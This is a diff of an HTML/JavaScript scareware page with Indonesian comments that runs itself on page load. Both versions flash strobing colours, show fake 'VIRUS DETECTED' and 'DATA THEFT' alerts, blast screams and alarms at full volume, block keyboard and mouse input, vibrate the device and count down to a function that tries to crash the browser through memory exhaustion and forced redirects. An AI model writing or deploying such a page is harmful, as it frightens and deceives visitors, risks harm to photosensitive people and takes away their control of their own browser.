@@ -20,137 +20,108 @@
             width: 100%;
         }
         .extreme-panic {
-            animation: extremePanic 0.05s infinite;
+            animation: extremePanic 0.1s infinite;
         }
         @keyframes extremePanic {
             0% { 
                 background: #ff0000; 
-                transform: scale(1) rotate(0deg) translate(0, 0);
+                transform: scale(1) rotate(0deg);
                 filter: hue-rotate(0deg) blur(0px);
             }
-            20% { 
+            25% { 
                 background: #0000ff; 
-                transform: scale(1.3) rotate(5deg) translate(-20px, -10px);
+                transform: scale(1.2) rotate(5deg);
                 filter: hue-rotate(90deg) blur(3px);
             }
-            40% { 
+            50% { 
                 background: #00ff00; 
-                transform: scale(0.7) rotate(-10deg) translate(15px, 20px);
+                transform: scale(0.8) rotate(-5deg);
                 filter: hue-rotate(180deg) blur(5px);
             }
-            60% { 
+            75% { 
                 background: #ffff00; 
-                transform: scale(1.2) rotate(8deg) translate(-15px, 15px);
+                transform: scale(1.1) rotate(3deg);
                 filter: hue-rotate(270deg) blur(2px);
-            }
-            80% { 
-                background: #ff00ff; 
-                transform: scale(0.8) rotate(-5deg) translate(10px, -20px);
-                filter: hue-rotate(360deg) blur(4px);
             }
             100% { 
                 background: #ff0000; 
-                transform: scale(1) rotate(0deg) translate(0, 0);
+                transform: scale(1) rotate(0deg);
                 filter: hue-rotate(0deg) blur(0px);
             }
         }
         .panic-text {
             position: fixed;
-            font-size: 60px;
+            font-size: 40px;
             font-weight: bold;
             color: #ffffff;
             text-shadow: 0 0 20px #ff0000;
             z-index: 10000;
-            animation: textPanic 0.1s infinite;
+            animation: textPanic 0.5s infinite;
         }
         @keyframes textPanic {
             0% { transform: scale(1) rotate(0deg); opacity: 1; }
-            50% { transform: scale(1.5) rotate(180deg); opacity: 0.7; }
-            100% { transform: scale(1) rotate(360deg); opacity: 1; }
+            50% { transform: scale(1.3) rotate(10deg); opacity: 0.7; }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
         }
         .blood-effect {
             position: fixed;
-            font-size: 40px;
+            font-size: 30px;
             color: #ff0000;
             z-index: 9999;
-            animation: bloodDrip 3s linear forwards;
+            animation: bloodDrip 2s linear forwards;
         }
         @keyframes bloodDrip {
             0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
             100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
         }
-        .cursor-hijack {
+        .countdown {
             position: fixed;
-            width: 50px;
-            height: 50px;
-            background: #ff0000;
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 99999;
-            animation: cursorFlash 0.2s infinite;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 100px;
+            color: #ffffff;
+            text-shadow: 0 0 30px #ff0000;
+            z-index: 100000;
+            animation: countdownPulse 0.5s infinite;
         }
-        @keyframes cursorFlash {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.5); }
+        @keyframes countdownPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.2); }
         }
     </style>
 </head>
 <body>
-    <!-- Extreme Panic Elements -->
     <div id="panicContainer"></div>
+    <div id="countdown" class="countdown">10</div>
 
-    <!-- Audio Elements - BANYAK BANGET -->
-    <audio id="alarm1" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-emergency-alert-siren-2907.mp3" type="audio/mp3">
+    <!-- AUDIO ELEMENTS - PAKE LOCAL FILE -->
+    <audio id="virusSound" loop>
+        <!-- Ganti "virus.mp3" dengan nama file sound kamu -->
+        <source src="virus.mp3" type="audio/mp3">
+        <source src="virus.wav" type="audio/wav">
+        <source src="virus.ogg" type="audio/ogg">
     </audio>
-    <audio id="alarm2" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-sci-fi-alarm-990.mp3" type="audio/mp3">
+
+    <audio id="screamSound">
+        <source src="scream.mp3" type="audio/mp3">
+        <source src="scream.wav" type="audio/wav">
     </audio>
-    <audio id="alarm3" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-air-raid-alarm-1000.mp3" type="audio/mp3">
-    </audio>
-    <audio id="scream1" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-woman-scream-1172.mp3" type="audio/mp3">
-    </audio>
-    <audio id="scream2">
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-horror-scream-2836.mp3" type="audio/mp3">
-    </audio>
-    <audio id="explosion1">
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-bomb-explosion-in-the-air-2801.mp3" type="audio/mp3">
-    </audio>
-    <audio id="explosion2" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-explosion-rumble-2396.mp3" type="audio/mp3">
-    </audio>
-    <audio id="heartbeat" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-fast-heartbeat-1161.mp3" type="audio/mp3">
-    </audio>
-    <audio id="static" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-static-radio-2797.mp3" type="audio/mp3">
-    </audio>
-    <audio id="laugh" loop>
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-evil-villain-laugh-310.mp3" type="audio/mp3">
-    </audio>
-    <audio id="glassBreak">
-        <source src="https://assets.mixkit.co/sfx/preview/mixkit-breaking-glass-2781.mp3" type="audio/mp3">
+
+    <audio id="alarmSound" loop>
+        <source src="alarm.mp3" type="audio/mp3">
+        <source src="alarm.wav" type="audio/wav">
     </audio>
 
     <script>
-        // Get all audio elements
-        const alarm1 = document.getElementById('alarm1');
-        const alarm2 = document.getElementById('alarm2');
-        const alarm3 = document.getElementById('alarm3');
-        const scream1 = document.getElementById('scream1');
-        const scream2 = document.getElementById('scream2');
-        const explosion1 = document.getElementById('explosion1');
-        const explosion2 = document.getElementById('explosion2');
-        const heartbeat = document.getElementById('heartbeat');
-        const staticSound = document.getElementById('static');
-        const laugh = document.getElementById('laugh');
-        const glassBreak = document.getElementById('glassBreak');
+        // Audio elements
+        const virusSound = document.getElementById('virusSound');
+        const screamSound = document.getElementById('screamSound');
+        const alarmSound = document.getElementById('alarmSound');
 
-        // PANIC MESSAGES - BANYAK BANGET
+        // Panic messages
         const panicMessages = [
-            "💀 MALWARE DETECTED! 💀",
+            "💀 VIRUS DETECTED! 💀",
             "🚨 SYSTEM COMPROMISED! 🚨",
             "📡 DATA THEFT IN PROGRESS!",
             "👁️ CAMERA HIJACKED!",
@@ -164,178 +135,156 @@
             "⚡ CRITICAL FAILURE!",
             "🔥 SYSTEM MELTDOWN!",
             "💥 EXPLOSIVE BREACH!",
-            "👻 GHOST IN SYSTEM!",
-            "🐍 PYTHON MALWARE!",
-            "🔪 TROJAN ACTIVATED!",
-            "☠️ RANSOMWARE ACTIVE!",
-            "👹 DEMONWARE RUNNING!",
-            "💣 LOGIC BOMB TRIGGERED!"
+            "👻 GHOST IN SYSTEM!"
         ];
 
         function startExtremePanic() {
-            // PLAY SEMUA SOUND SEKALIGUS - VOLUME MAX!
-            playAllSoundsMaxVolume();
+            console.log("Starting extreme panic...");
+            
+            // PLAY SOUNDS - Volume MAX!
+            playAllSounds();
             
             // EXTREME VISUAL EFFECTS
             document.body.classList.add('extreme-panic');
             
-            // HIJACK SEMUA INPUT
+            // HIJACK CONTROLS
             hijackEverything();
             
-            // CREATE BLOOD EFFECTS
+            // CREATE EFFECTS
             createBloodRain();
-            
-            // SHOW PANIC TEXTS
             showPanicTexts();
+            startCountdown();
             
-            // CREATE CURSOR HIJACK
-            createCursorHijack();
-            
-            // START DEVICE VIBRATION
-            startExtremeVibration();
-            
-            // AUTO CRASH COUNTDOWN
-            startCrashCountdown();
-            
-            // RANDOM EXPLOSIONS
-            startRandomExplosions();
-            
-            // SCREAM LOOP
-            startScreamLoop();
+            // START VIBRATION
+            startVibration();
         }
 
-        function playAllSoundsMaxVolume() {
-            const sounds = [alarm1, alarm2, alarm3, scream1, explosion2, heartbeat, staticSound, laugh];
+        function playAllSounds() {
+            console.log("Playing sounds...");
             
-            sounds.forEach(sound => {
-                sound.volume = 1.0;
-                sound.play().catch(e => console.log('Sound play failed'));
+            // Set volume to MAX
+            virusSound.volume = 1.0;
+            alarmSound.volume = 1.0;
+            screamSound.volume = 1.0;
+            
+            // Play main virus sound
+            virusSound.play().then(() => {
+                console.log("Virus sound playing");
+            }).catch(error => {
+                console.log("Virus sound error:", error);
+                // Fallback - create oscillator sound
+                createFallbackSound();
             });
             
-            // Play single sounds randomly
+            // Play alarm sound
+            alarmSound.play().catch(error => {
+                console.log("Alarm sound error:", error);
+            });
+            
+            // Play scream every 5 seconds
             setInterval(() => {
-                explosion1.currentTime = 0;
-                explosion1.volume = 1.0;
-                explosion1.play();
+                screamSound.currentTime = 0;
+                screamSound.play().catch(error => {
+                    console.log("Scream sound error:", error);
+                });
+            }, 5000);
+        }
+
+        function createFallbackSound() {
+            // Create emergency sound using Web Audio API
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
                 
-                scream2.currentTime = 0;
-                scream2.volume = 1.0;
-                scream2.play();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
                 
-                glassBreak.currentTime = 0;
-                glassBreak.volume = 1.0;
-                glassBreak.play();
-            }, 3000);
+                oscillator.type = 'sawtooth';
+                oscillator.frequency.setValueAtTime(200, audioContext.currentTime);
+                gainNode.gain.setValueAtTime(0.5, audioContext.currentTime);
+                
+                oscillator.start();
+                
+                // Change frequency randomly
+                setInterval(() => {
+                    oscillator.frequency.setValueAtTime(100 + Math.random() * 500, audioContext.currentTime);
+                }, 100);
+                
+            } catch (error) {
+                console.log("Fallback sound failed:", error);
+            }
         }
 
         function hijackEverything() {
-            // Block all keyboard input
+            // Block keyboard
             document.addEventListener('keydown', (e) => {
                 e.preventDefault();
-                // Create random panic effect on key press
-                createExplosionEffect(e.clientX, e.clientY);
+                createExplosionEffect(Math.random() * window.innerWidth, Math.random() * window.innerHeight);
             });
 
-            // Hijack mouse movement
-            document.addEventListener('mousemove', (e) => {
-                // Randomly jump screen
-                if (Math.random() > 0.8) {
-                    window.scrollTo(
-                        Math.random() * 1000,
-                        Math.random() * 1000
-                    );
-                }
-            });
-
-            // Block all clicks
+            // Block mouse
             document.addEventListener('click', (e) => {
                 e.preventDefault();
                 createBloodEffect(e.clientX, e.clientY);
             });
 
-            // Prevent right click
+            // Block right click
             document.addEventListener('contextmenu', (e) => {
                 e.preventDefault();
             });
 
-            // Block touch
-            document.addEventListener('touchstart', (e) => {
-                e.preventDefault();
+            // Hijack mouse movement
+            document.addEventListener('mousemove', (e) => {
+                if (Math.random() > 0.7) {
+                    window.scrollTo(Math.random() * 500, Math.random() * 500);
+                }
             });
         }
 
         function createBloodRain() {
             setInterval(() => {
-                for (let i = 0; i < 5; i++) {
+                for (let i = 0; i < 3; i++) {
                     const blood = document.createElement('div');
                     blood.className = 'blood-effect';
                     blood.textContent = '💀';
                     blood.style.left = Math.random() * 100 + 'vw';
-                    blood.style.fontSize = (20 + Math.random() * 40) + 'px';
+                    blood.style.fontSize = (20 + Math.random() * 30) + 'px';
                     document.body.appendChild(blood);
                     
-                    setTimeout(() => blood.remove(), 3000);
+                    setTimeout(() => blood.remove(), 2000);
                 }
-            }, 200);
+            }, 300);
         }
 
         function showPanicTexts() {
             setInterval(() => {
-                for (let i = 0; i < 3; i++) {
+                for (let i = 0; i < 2; i++) {
                     const text = document.createElement('div');
                     text.className = 'panic-text';
                     text.textContent = panicMessages[Math.floor(Math.random() * panicMessages.length)];
-                    text.style.left = Math.random() * 80 + 'vw';
-                    text.style.top = Math.random() * 80 + 'vh';
+                    text.style.left = Math.random() * 70 + 'vw';
+                    text.style.top = Math.random() * 70 + 'vh';
                     text.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                     document.body.appendChild(text);
                     
-                    setTimeout(() => text.remove(), 2000);
+                    setTimeout(() => text.remove(), 3000);
                 }
-            }, 500);
+            }, 800);
         }
 
-        function createCursorHijack() {
-            const cursor = document.createElement('div');
-            cursor.className = 'cursor-hijack';
-            document.body.appendChild(cursor);
-
-            document.addEventListener('mousemove', (e) => {
-                cursor.style.left = (e.clientX - 25) + 'px';
-                cursor.style.top = (e.clientY - 25) + 'px';
-            });
-        }
-
-        function startExtremeVibration() {
-            if (navigator.vibrate) {
-                setInterval(() => {
-                    navigator.vibrate([100, 50, 100, 50, 100, 50, 200]);
-                }, 1000);
-            }
-        }
-
-        function startCrashCountdown() {
+        function startCountdown() {
             let count = 10;
-            const countdownElement = document.createElement('div');
-            countdownElement.style.position = 'fixed';
-            countdownElement.style.top = '50%';
-            countdownElement.style.left = '50%';
-            countdownElement.style.transform = 'translate(-50%, -50%)';
-            countdownElement.style.fontSize = '100px';
-            countdownElement.style.color = '#ffffff';
-            countdownElement.style.zIndex = '100000';
-            countdownElement.style.textShadow = '0 0 30px #ff0000';
-            countdownElement.textContent = count;
-            document.body.appendChild(countdownElement);
-
+            const countdownElement = document.getElementById('countdown');
+            
             const countdown = setInterval(() => {
                 count--;
                 countdownElement.textContent = count;
                 
                 // Increase intensity
                 if (count <= 5) {
-                    countdownElement.style.animation = 'textPanic 0.05s infinite';
-                    countdownElement.style.fontSize = '150px';
+                    countdownElement.style.fontSize = '120px';
+                    countdownElement.style.animation = 'countdownPulse 0.2s infinite';
                 }
                 
                 if (count <= 0) {
@@ -345,36 +294,28 @@
             }, 1000);
         }
 
-        function startRandomExplosions() {
-            setInterval(() => {
-                createExplosionEffect(
-                    Math.random() * window.innerWidth,
-                    Math.random() * window.innerHeight
-                );
-            }, 1000);
-        }
-
-        function startScreamLoop() {
-            setInterval(() => {
-                scream1.currentTime = 0;
-                scream1.play();
-            }, 5000);
+        function startVibration() {
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([200, 100, 200, 100, 200]);
+                }, 2000);
+            }
         }
 
         function createExplosionEffect(x, y) {
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < 10; i++) {
                 const particle = document.createElement('div');
                 particle.style.position = 'fixed';
                 particle.style.left = x + 'px';
                 particle.style.top = y + 'px';
-                particle.style.width = '20px';
-                particle.style.height = '20px';
+                particle.style.width = '15px';
+                particle.style.height = '15px';
                 particle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                 particle.style.borderRadius = '50%';
                 particle.style.zIndex = '99999';
                 
                 const angle = Math.random() * Math.PI * 2;
-                const distance = 100 + Math.random() * 200;
+                const distance = 50 + Math.random() * 100;
                 
                 document.body.appendChild(particle);
                 
@@ -395,40 +336,44 @@
             blood.style.position = 'fixed';
             blood.style.left = x + 'px';
             blood.style.top = y + 'px';
-            blood.style.fontSize = '40px';
+            blood.style.fontSize = '30px';
             blood.style.color = '#ff0000';
             blood.style.zIndex = '99999';
             blood.textContent = '🩸';
-            blood.style.animation = 'textPanic 0.1s infinite';
             document.body.appendChild(blood);
             
             setTimeout(() => blood.remove(), 2000);
         }
 
         function triggerBrowserCrash() {
-            // Extreme crash methods
+            // Try to crash or close browser
             try {
-                // Method 1: Memory overload
+                // Memory overload
                 const hugeArray = [];
-                while(true) {
-                    hugeArray.push(new Array(1000000).fill('CRASH'));
+                for (let i = 0; i < 100; i++) {
+                    hugeArray.push(new Array(100000).fill('CRASH'));
                 }
-            } catch(e) {
-                // Method 2: Infinite redirect
-                for(let i = 0; i < 100; i++) {
+            } catch (e) {
+                // Redirect to blank
+                for (let i = 0; i < 10; i++) {
                     window.location.href = 'about:blank';
                 }
-                // Method 3: Close window
+                // Try to close
                 window.open('', '_self', '');
                 window.close();
             }
         }
 
-        // START PANIC IMMEDIATELY ON PAGE LOAD
+        // START PANIC IMMEDIATELY
         window.onload = startExtremePanic;
 
-        // Also start when DOM is ready
-        document.addEventListener('DOMContentLoaded', startExtremePanic);
+        // Auto-start after 3 seconds if sounds fail
+        setTimeout(() => {
+            if (virusSound.paused) {
+                console.log("Sounds failed, using fallback");
+                createFallbackSound();
+            }
+        }, 3000);
 
     </script>
 </body>
